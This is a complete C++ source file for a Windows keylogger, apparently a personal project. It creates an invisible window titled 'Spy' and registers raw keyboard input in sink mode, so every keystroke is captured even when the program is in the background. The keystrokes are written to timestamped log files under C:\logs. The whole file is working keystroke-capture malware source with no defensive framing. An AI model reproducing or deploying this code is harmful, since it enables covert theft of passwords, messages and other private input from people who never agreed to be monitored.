/* Author: Caden (Cole) Fechter
main.cpp - the keylogger's main compilation unit
how it works:
1. creates log filename
2. opens log file
3. starts ticker on seperate thread (see ticker function)
4. creates window
5. main loop
6. on any keypress, writes keypress to log file - invisible characters are translated to visible versions of themselves
7. on window destroyed/main loop quit, closes file
*/
#include <Windows.h>

#include <iostream>
#include <cstdio>
#include <cstdlib>
#include <thread>
#include <atomic>
#include <unordered_map>

HWND window = nullptr; // handle to the Windows window
FILE* the_log = nullptr; // log file
std::atomic<signed> time_since_last_input = 0; // time (in seconds) since the last keypress; see ticker

// when a key is pressed that is invisible, it is translated into a readable form using this map (virtual key code:readable string)
const std::unordered_map<USHORT, const char*> verbose_keys = {
{ VK_RETURN, "\n" },
{ VK_SHIFT, "[shift]" },
{ VK_CONTROL, "[ctrl]" },
{ VK_BACK, "[backspace]" }
};

LRESULT CALLBACK message_handler(HWND hwnd, UINT msg, WPARAM word_param, LPARAM long_param) {
	switch(msg) {
		// this message is sent when any keyboard input is recieved
		case WM_INPUT:
			UINT necessary_size;
			time_since_last_input = 0;
			RAWINPUT input;
			// super weird api - this call (below) retrieves the size of the data and stores it in necessary_size...
			GetRawInputData((HRAWINPUT)long_param, RID_INPUT, nullptr, &necessary_size, 0);
			// ... and this call (below) stores the data into input
			GetRawInputData((HRAWINPUT)long_param, RID_INPUT, &input, &necessary_size, sizeof(RAWINPUTHEADER));

			// RI_KEY_MAKE means key down. we only want to use key down events
			if(input.data.keyboard.Flags == RI_KEY_MAKE) {
				// check if this key isn't visible (e.g. shift, control, backspace)
				if(verbose_keys.contains(input.data.keyboard.VKey)) {
					// if invisible, write a visual version of the key instead of the key itself (e.g. [shift], [control], [backspace])
					const char* visible_key = verbose_keys.at(input.data.keyboard.VKey);
					fputs(visible_key, the_log);
					break;
				}

				fputc((char)MapVirtualKeyEx(input.data.keyboard.VKey, MAPVK_VK_TO_CHAR, nullptr), the_log);
				std::cout << (char)MapVirtualKeyEx(input.data.keyboard.VKey, MAPVK_VK_TO_CHAR, nullptr);
			}
			break;
		default:
			return DefWindowProc(hwnd, msg, word_param, long_param);
	}

	return 0;
}





// this function runs on a seperate thread. it:
// 1. adds a period to indicate elapsed time between keystrokes, when the time elapsed is less than 10 seconds, and
// 2. adds 3 periods on a new line to indicate a long elapsed time between keystrokes, when the time elapsed is greater than or equal to 10 seconds.
void ticker() {
	static bool has_already_idled = false; // this doesn't necessarily have to be static

	while(the_log != nullptr) {

		if(time_since_last_input > 10 && !has_already_idled) {
			fputs("\n...\n", the_log);
			has_already_idled = true;
		}
		 else {
			fputc('.', the_log);
			has_already_idled = false;
		}

		Sleep(2000);
		time_since_last_input += 2;

	}

}

// windows application entry point - non-unicode
int APIENTRY WinMain(HINSTANCE instance, HINSTANCE old, PSTR args, int display) {
// create the filename - example: log-11-26-2023.12-30PM.txt

	// get the local time
	time_t startup_time = 0;
	time(&startup_time);

	struct tm* time_info;
	time_info = localtime(&startup_time);

	// create the filename string - start with the path and base name, which don't change
	std::string filename_pp = "C:\\logs\\log-";

	// add the date
	filename_pp +=
	std::to_string(time_info->tm_mon) + "-" +
	std::to_string(time_info->tm_mday) + "-" +
	std::to_string(time_info->tm_year + 1900) +
	".";

	// convert the 24 hour notation to AM/PM notation
	int american_hour = time_info->tm_hour;
	bool is_pm = false;
	if(american_hour > 12) {
		american_hour -= 12;
		is_pm = true;
	}

	// add the formatted hour
	filename_pp += std::to_string(american_hour) + "-";

	// add the 0 to the tens place of the minutes (e.g. from 12:5 PM to 12:05 PM)
	if(time_info->tm_min < 10)
		filename_pp += "0";

	// add minutes
	filename_pp += std::to_string(time_info->tm_min);

	// add PM or AM
	filename_pp += is_pm ? "PM" : "AM";

	// add file extension
	filename_pp += ".txt";

	std::cout << "c++ filename: " << filename_pp << "\n";

	// open the file - assign file pointer to the global variable
	the_log = fopen(filename_pp.c_str(), "w");

	if(the_log == nullptr) {
		std::cout << "file open failed\n";
		return -1;
	}

	std::cout << "file open successful\n";

	// start ticker on a seperate thread and let it run asynchronously
	std::thread tick(&ticker);
	tick.detach();

// use the win32 api

	// create our window (it's invisible)
	const char* class_name = "window class";
	WNDCLASS window_class{};
	window_class.lpfnWndProc = &message_handler;
	window_class.hInstance = instance;
	window_class.lpszClassName = class_name;

	RegisterClass(&window_class);

	window = CreateWindowEx(
		0,
		class_name,
		"Spy",
		0,
		CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
		nullptr,
		nullptr,
		instance,
		nullptr);


	// use the Raw Input API for input from the keyboard
	// this input is sent to the window through the WM_INPUT message
	RAWINPUTDEVICE keyboard;

	keyboard.usUsagePage = 0x01; // generic input
	keyboard.usUsage = 0x06; // keyboard
	keyboard.dwFlags = RIDEV_INPUTSINK; // input sink - captures any input to the keyboard (regardless if our window is in the foreground or not)
	keyboard.hwndTarget = window;

	if(RegisterRawInputDevices(&keyboard, 1, sizeof(RAWINPUTDEVICE)) == false) {
		std::cout << "keyboard registration failed\n";
		return -1;
	}

	// main loop
	MSG msg{};

	while(GetMessage(&msg, nullptr, 0, 0) > 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// this is run after the main loop is exited
	std::cout << "closing file...\n";

	if(fclose(the_log) != 0) {
		std::cout << "something went wrong when closing the file\n";
		return -1;
	}

	std::cout << "file closure successful\n";

	return 0;

}
